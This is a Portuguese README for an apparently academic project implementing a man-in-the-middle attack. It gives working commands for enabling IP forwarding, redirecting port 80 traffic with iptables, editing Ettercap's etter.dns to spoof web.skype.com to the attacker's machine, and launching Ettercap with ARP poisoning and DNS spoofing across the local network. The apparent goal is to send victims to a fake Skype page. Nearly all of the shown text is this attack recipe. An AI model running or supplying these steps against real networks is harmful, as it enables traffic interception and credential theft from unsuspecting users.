# sgd-projectMITM - Implementação de um Man in the Middle
### Equipe ###
Flávio Henrique e Lucas Duete

### Requisitos ###
* Java
* Maven
* Postgres
* Ettercap
* TomCat

### Implantação do Ettercap ###

Abra o primeiro terminal. Agora vamos ativar o redirecionamento de pacotes. <br/>
`# echo 1 > /proc/sys/net/ipv4/ip_forward` <br/>
<br/>
Agora vamos efetuar todo o redirecionamento de pacotes que chegar na porta 80 da nossa máquina para a porta 8080. <br/>
`iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080` <br/>
<br/>
<b>Agoro iremos configurar o DNS Spoofing.</b><br/>
Primeiramente edite o arquivos etter.dns do ettercap.<br/>
`# pico /etc/ettercap/etter.dns`<br/>
<br/>
<table border=0>
  <tr>
    <td>https://web.skype.com/</td>
    <td>A</td>
    <td>localhost</td>
  </tr>
  <tr>
    <td>web.skype.com	</td>
    <td>A</td>
    <td>localhost</td>
  </tr>  
</table>
<br/>
Depois executar o seguinte comando para iniciar o Ettercap:<br/>
`ettercap -T -q -M arp -i eth0 -P dns_spoof ///`<br/>

